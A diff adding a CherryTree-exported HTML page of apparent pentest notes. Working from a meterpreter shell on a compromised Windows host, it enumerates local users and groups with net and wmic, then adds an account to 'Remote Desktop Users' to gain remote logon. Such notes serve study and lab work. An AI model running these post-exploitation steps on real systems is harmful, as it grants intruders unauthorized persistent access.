@@ -1,0 +1,12 @@
+<!doctype html>
+<html>
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <title>Remotely from the Attacker machine (shell cmd)</title>
+  <meta name="generator" content="CherryTree">
+  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
+</head>
+<body>
+<div class='page'><h1 class='title'>Remotely from the Attacker machine (shell cmd)</h1><br/><strong><h3>Remotely from the Attacker machine</h3></strong><br />1. Information gathering<br /><div class="codebox"><div class="codebox">meterpreter&nbsp;&gt;&nbsp;shell<br />C:\Users\danie\Desktop&gt;&nbsp;net&nbsp;localgroup&nbsp;users&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#all&nbsp;the&nbsp;users<br />C:\Users\danie\Desktop&gt;&nbsp;wmic&nbsp;group&nbsp;where&nbsp;localaccount=&quot;true&quot;&nbsp;get&nbsp;name&nbsp;&nbsp;&nbsp;#list&nbsp;all&nbsp;groups&nbsp;<br />C:\Users\danie\Desktop&gt;&nbsp;net&nbsp;localgroup&nbsp;&quot;Remote&nbsp;Desktop&nbsp;Users&quot;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#members&nbsp;in&nbsp;this&nbsp;group&nbsp;are&nbsp;granted&nbsp;the&nbsp;right&nbsp;to&nbsp;logon&nbsp;remotely</div></div><br /><br />2. Add user to the &quot;Remote Desktop Users&quot; group<br /><div class="codebox"><div class="codebox">C:\Users\danie\Desktop&gt;&nbsp;net&nbsp;localgroup&nbsp;&quot;Remote&nbsp;Desktop&nbsp;Users&quot;&nbsp;danie&nbsp;/add</div></div><br /><a href=""><img src="images/873-1.png" alt="images/873-1.png" /></a><br /><br /><a href=""><img src="images/873-2.png" alt="images/873-2.png" /></a><a href=""><img src="images/873-3.png" alt="images/873-3.png" /></a></div>
+</body>
+</html>
